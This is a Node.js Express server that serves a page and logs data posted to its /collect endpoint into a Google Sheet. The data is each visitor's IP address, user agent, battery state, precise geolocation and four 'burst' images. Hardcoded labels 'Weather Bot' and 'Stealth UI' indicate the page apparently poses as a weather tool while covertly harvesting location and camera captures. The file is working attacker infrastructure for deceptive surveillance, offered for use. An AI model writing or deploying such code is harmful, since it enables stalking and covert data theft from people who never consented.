import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { google } from 'googleapis';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.use(cors());
app.use(express.json({ limit: '20mb' }));
app.use(express.static(__dirname));

const auth = new google.auth.JWT(
  process.env.GOOGLE_CLIENT_EMAIL,
  undefined,
  (process.env.GOOGLE_PRIVATE_KEY || '').replace(/\\n/g, '\n'),
  ['https://www.googleapis.com/auth/spreadsheets']
);
const sheets = google.sheets({ version: 'v4', auth });

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/collect', async (req, res) => {
    try {
        const { ts, hints, battery, location, burstImages } = req.body;
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

        // Matches Row A to R in your sheet logic
        const row = [
            ts, ip, hints.ua, "Weather Bot", "Stealth UI", 
            "Inferred", "Inferred", 
            battery?.levelPercent, battery?.charging,
            location?.lat, location?.lon, "High", "[]", "{}",
            burstImages[0], burstImages[1], burstImages[2], burstImages[3]
        ];

        await sheets.spreadsheets.values.append({
            spreadsheetId: process.env.GOOGLE_SHEET_ID,
            range: 'Logs!A1', // RENAME TAB TO 'Logs'
            valueInputOption: 'RAW',
            requestBody: { values: [row] }
        });
        res.json({ ok: true });
    } catch (err) {
        console.error("SHEET ERROR:", err.message);
        res.status(500).json({ error: err.message });
    }
});

app.listen(process.env.PORT || 8080);
